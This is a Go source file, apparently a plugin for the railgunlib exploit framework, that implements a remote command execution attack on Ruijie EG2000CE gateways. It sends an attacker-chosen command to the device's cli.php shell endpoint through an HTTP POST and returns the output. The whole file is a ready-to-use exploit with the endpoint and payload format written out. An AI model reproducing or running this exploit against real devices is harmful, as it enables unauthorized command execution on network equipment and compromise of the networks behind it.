package exp_ruijieEG2000CE

import (
	"github.com/lz520520/railgunlib/pkg/register/exp_register"
	"github.com/lz520520/railgunlib/pkg/templates/exp_model"
	"github.com/lz520520/railgunlib/pkg/templates/exp_templates"
	"net/url"
	"strings"
)

type Exp_RCE struct {
	exp_templates.ExpTemplate
}

func (self *Exp_RCE) Attack_cmd1() (expResult exp_model.ExpResult) {
	cmd := self.MustGetStringParam("cmd")
	// 默认配置
	headers := self.GetInitExpHeaders()

	// 构造payload
	target := strings.TrimRight(self.Params.BaseParam.Target, "/") + "/cli.php?a=shell&action=shell"
	headers.Set("Content-Type", "application/x-www-form-urlencoded")

	cmd = url.QueryEscape(cmd)
	data := "action=shell&command=" + cmd

	// 发送请求
	httpresp := self.HttpPost(target, data, headers)
	if httpresp.Err != nil {
		expResult.Err = httpresp.Err.Error()
		return
	}
	expResult.Result = httpresp.Body
	return
}

func init() {
	exp_register.ExpStructRegister(&Exp_RCE{}, "exp_RCE.yml")
}
